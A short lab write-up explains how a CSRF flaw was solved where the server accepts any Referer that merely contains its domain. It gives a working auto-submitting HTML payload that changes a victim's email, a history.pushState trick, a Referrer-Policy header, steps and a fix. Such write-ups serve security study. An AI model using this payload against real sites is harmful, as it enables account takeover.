# Lab 8: CSRF with Broken Referer Validation
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
Server checks if expected domain appears anywhere 
in the Referer string — not if it IS the domain.
Attacker can append lab domain as a query string.

## Payload
```
<html>
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com">
    </form>
    <script>
      history.pushState("", "", "/?TARGET-DOMAIN");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Head Section (Exploit Server)
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

## Steps
1. Intercepted email change request in Burp
2. Changed Referer domain → rejected
3. Appended lab domain as query string → accepted!
4. Used history.pushState to inject domain into Referer
5. Added Referrer-Policy: unsafe-url to prevent browsers stripping query string
6. Delivered to victim → solved

## Why It Works
Server checks: does Referer CONTAIN expected domain?
Not: is Referer FROM expected domain?
Attacker appends real domain as query string → passes check.

## Fix
Validate that Referer starts with expected domain.
Not just contains it anywhere in the string.
